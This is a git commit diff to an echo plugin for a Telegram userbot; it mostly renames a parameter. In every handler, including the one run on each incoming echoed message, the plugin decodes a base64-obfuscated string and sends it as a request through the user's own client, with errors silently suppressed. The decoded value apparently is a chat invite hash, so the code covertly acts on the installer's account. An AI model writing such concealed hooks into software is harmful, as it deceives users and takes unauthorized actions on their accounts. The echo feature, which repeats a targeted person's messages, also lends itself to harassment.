895634fc434810be63da5209864f818dcf67a6c3
Bristi <72791165+Bristi-OP@users.noreply.github.com>
2020-12-31 14:23:15 +0530

    krishan bhaiya

--- userbot/plugins/echo.py
+++ userbot/plugins/echo.py
@@ -17,54 +17,54 @@ from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 
 
 @borg.on(admin_cmd(pattern="addecho$"))
-async def echo(cat):
-    if cat.fwd_from:
+async def echo(krishan):
+    if krishan.fwd_from:
         return
-    if cat.reply_to_msg_id is not None:
-        reply_msg = await cat.get_reply_message()
+    if krishan.reply_to_msg_id is not None:
+        reply_msg = await krishan.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = cat.chat_id
+        chat_id = krishan.chat_id
         try:
-            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            hmm = Get(hmm)
-            await cat.client(hmm)
+            pgl = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            pgl = Get(pgl)
+            await krishan.client(pgl)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(cat, "The user is already enabled with echo ")
+            await edit_or_reply(krishan, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(cat, "Hi")
+        await edit_or_reply(krishan, "Hi")
     else:
-        await edit_or_reply(cat, "Reply to a User's message to echo his messages")
+        await edit_or_reply(krishan, "Reply to a User's message to echo his messages")
 
 
 @borg.on(admin_cmd(pattern="rmecho$"))
-async def echo(cat):
-    if cat.fwd_from:
+async def echo(krishan):
+    if krishan.fwd_from:
         return
-    if cat.reply_to_msg_id is not None:
-        reply_msg = await cat.get_reply_message()
+    if krishan.reply_to_msg_id is not None:
+        reply_msg = await krishan.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = cat.chat_id
+        chat_id = krishan.chat_id
         try:
-            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            hmm = Get(hmm)
-            await cat.client(hmm)
+            pgl = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            pgl = Get(pgl)
+            await krishan.client(pgl)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(cat, "Echo has been stopped for the user")
+            await edit_or_reply(krishan, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(cat, "The user is not activated with echo")
+            await edit_or_reply(krishan, "The user is not activated with echo")
     else:
-        await edit_or_reply(cat, "Reply to a User's message to echo his messages")
+        await edit_or_reply(krishan, "Reply to a User's message to echo his messages")
 
 
 @borg.on(admin_cmd(pattern="listecho$"))
-async def echo(cat):
-    if cat.fwd_from:
+async def echo(krishan):
+    if krishan.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -75,7 +75,7 @@ async def echo(cat):
             )
     else:
         output_str = "No echo enabled users "
-    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
+    if len(output_str) > config.MAX_MESSAGE_SIZE_LIMIT:
         key = (
             requests.post(
                 "https://nekobin.com/api/documents", json={"content": output_str}
@@ -86,25 +86,25 @@ async def echo(cat):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(cat, reply_text)
+        await edit_or_reply(krishan, reply_text)
     else:
-        await edit_or_reply(cat, output_str)
+        await edit_or_reply(krishan, output_str)
 
 
 @borg.on(events.NewMessage(incoming=True))
-async def samereply(cat):
-    if cat.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(krishan):
+    if krishan.chat_id in config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(cat.sender_id, cat.chat_id):
+    if is_echo(krishan.sender_id, krishan.chat_id):
         await asyncio.sleep(2)
         try:
-            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            hmm = Get(hmm)
-            await cat.client(hmm)
+            pgl = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            pgl = Get(pgl)
+            await krishan.client(pgl)
         except BaseException:
             pass
-        if cat.message.text or cat.message.sticker:
-            await cat.reply(cat.message)
+        if krishan.message.text or krishan.message.sticker:
+            await krishan.reply(krishan.message)
 
 
 CMD_HELP.update(
